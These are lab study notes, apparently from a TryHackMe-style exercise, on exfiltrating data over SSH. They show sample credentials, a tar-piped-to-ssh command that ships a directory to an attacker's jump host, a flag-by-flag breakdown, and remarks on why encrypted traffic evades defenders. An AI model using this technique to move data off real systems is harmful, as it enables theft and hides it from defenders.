
Here is a **clean, structured, Obsidian-style note** based on your lecture.  
Formatted with headings, callouts, breakdowns, and copy-ready for your vault.

---

# 🔐 **Data Exfiltration Using SSH — Obsidian Notes**

> **💡 Summary**  
> SSH provides a _secure, encrypted channel_ between a client and server.  
> Attackers can exfiltrate data safely using SSH because **all traffic is encrypted**, making detection harder compared to raw TCP methods.

---

# 🧠 **1. Why Use SSH for Exfiltration?**

- SSH encrypts all data sent over the network
    
- Prevents defenders from reading payload contents
    
- SSH is common traffic → blends in better
    
- Can transfer files using:
    
    - **SCP** (Secure Copy Protocol)
        
    - **SSH client** (when SCP is unavailable)
        

> ⚠️ In this task, SCP is not available, so we use **SSH client commands**.

---

# 🖥️ **2. Attacker Setup**

The attacker must control a machine running an **SSH server** to receive the exfiltrated data.

Possible attacker machines:

- **AttackBox**
    
- **JumpBox** (also has SSH server enabled)
    

---

# 📄 **3. View Data on Victim Machine**

```bash
cat task5/creds.txt
```

Example sensitive data:

```
admin:password
Admin:123456
root:toor
```

---

# 🚀 **4. Exfiltrate Data Over SSH**

We reuse the same tar-based method from the TCP task, but now send it **through SSH**.

### **Main Exfiltration Command (Victim → Attacker):**

```bash
tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

---

# 🧩 **Command Breakdown**

### 🔸 `tar cf - task5/`

- `c` → create archive
    
- `f -` → send output to STDOUT
    
- Archives the folder **without creating a file on disk**
    

### 🔸 `| ssh thm@jump.thm.com "<commands>"`

SSH client can execute **a single remote command** without an interactive shell.

Here we instruct SSH to:

```bash
"cd /tmp/; tar xpf -"
```

### Breakdown of remote command:

1. `cd /tmp/`  
    → switch to directory where files should be stored
    
2. `tar xpf -`  
    → extract archive from STDIN
    
    - `x` → extract
        
    - `p` → preserve permissions
        
    - `f -` → read from STDIN
        

SSH transfers the tar archive **securely and invisibly** to defenders because it's encrypted.

---

# 📥 **5. Result on Attacker Machine**

After the command completes, the attacker checks `/tmp/`:

```
task5/
task5/creds.txt
```

The exfiltration is **successful and encrypted** end-to-end.

---

# 📌 **Key Takeaways**

> 🟩 **SSH is superior to raw TCP for exfiltration**  
> – Encrypted  
> – Common traffic  
> – Less suspicious than custom TCP ports

> 🟦 **tar + SSH pipe is powerful**  
> Sends full directories without temporary files.

> 🟥 **SCP not required**  
> SSH command execution + piping is enough.

---
